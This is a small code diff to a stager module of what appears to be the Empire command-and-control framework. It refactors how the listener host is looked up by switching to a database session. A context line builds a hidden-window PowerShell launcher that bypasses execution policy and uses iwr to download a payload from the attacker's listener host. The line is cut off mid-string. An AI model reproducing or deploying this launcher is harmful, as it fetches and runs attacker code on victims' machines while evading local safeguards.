@@ -4,6 +4,7 @@ import base64
 from builtins import object
 
 from empire.server.common import helpers
+from empire.server.core.db.base import SessionLocal
 
 
 class Stager(object):
@@ -88,9 +89,8 @@ class Stager(object):
         else:
             obfuscate = False
 
-        host = self.mainMenu.listeners.activeListeners[listener_name]["options"][
-            "Host"
-        ]["Value"]
+        listener = self.mainMenu.listenersv2.get_by_name(SessionLocal(), listener_name)
+        host = listener.options["Host"]["Value"]
 
         launcher = f"powershell.exe -nol -w 1 -nop -ep bypass \"(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{host}/download/powershell/"
 
